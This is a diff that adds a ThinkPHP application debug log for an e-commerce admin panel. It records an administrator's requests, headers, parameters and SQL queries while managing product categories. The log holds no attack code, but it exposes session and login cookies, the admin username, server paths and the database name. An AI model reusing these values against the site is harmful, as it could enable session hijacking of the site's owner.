@@ -1,0 +1,3531 @@
+---------------------------------------------------------------
+[ 2024-06-13T00:07:01+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=upproduct&formname=product
+[运行时间：0.436631s] [吞吐率：2.29req/s] [内存消耗：3,438.02kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=product',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'upproduct',
+  'formname' => 'product',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/table_edi/upproduct.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000793s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001169s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006344s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.000974s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001504s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.047314s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003758s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000587s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000858s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004417s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001200s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000377s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.006974s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.007068s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006892s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.007141s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.006972s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.006677s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006681s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006623s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006464s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006454s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006400s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006304s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.005717s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.005752s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.005769s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.005776s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.005864s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.005880s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.005701s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.005593s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.005571s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.005560s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.005616s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.005641s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.005915s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005922s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006023s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006033s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006106s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005907s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005864s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005795s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006733s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005893s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005837s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005785s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.005416s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005470s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005483s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005475s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005448s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005412s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005434s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005463s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005545s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005467s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005563s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005681s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005438s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001151s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000370s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.000921s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000319s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000874s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000264s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000702s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000237s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000218s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:01+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsclass?formname=productc
+[运行时间：0.037113s] [吞吐率：26.94req/s] [内存消耗：2,730.13kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.005128s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001086s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `parent_id` = '0' [ RunTime:0.000741s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:01+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree?formname=productc
+[运行时间：0.110039s] [吞吐率：9.09req/s] [内存消耗：3,808.17kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001836s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001257s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001358s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:39+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/selclass?formnam=productc&selname=NHAS
+[运行时间：0.028865s] [吞吐率：34.64req/s] [内存消耗：2,712.88kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'selclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formnam' => 'productc',
+  'selname' => 'NHAS',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->selclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000745s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001049s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `name` LIKE '%NHAS%' [ RunTime:0.000820s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:41+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/selclass?formnam=productc&selname=NHAS
+[运行时间：0.028758s] [吞吐率：34.77req/s] [内存消耗：2,712.88kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'selclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formnam' => 'productc',
+  'selname' => 'NHAS',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->selclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000721s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001107s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `name` LIKE '%NHAS%' [ RunTime:0.000859s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:44+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/addclass
+[运行时间：0.029406s] [吞吐率：34.01req/s] [内存消耗：2,683.36kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'addclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '105',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'name' => 'CONJUNTO DE CORTADOR DE UNHAS',
+  'laug' => '简体中文',
+  'topid' => '2137',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->addclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000812s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001297s ]
+[ sql ] [ SQL ] INSERT INTO `productc` (`name` , `laug` , `parent_id` , `create_time` , `sort`) VALUES ('CONJUNTO DE CORTADOR DE UNHAS' , '简体中文' , '2137' , '2024-06-13 00:07:44' , 0) [ RunTime:0.001590s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:46+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc
+[运行时间：0.473149s] [吞吐率：2.11req/s] [内存消耗：3,439.85kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'newsclass',
+  'formname' => 'productc',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/page/newsclass.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000817s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001149s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006126s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.001053s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001528s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.048129s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003583s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000522s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000806s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.005198s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001247s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000465s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.007104s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.006804s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006846s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.006937s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.008385s ]
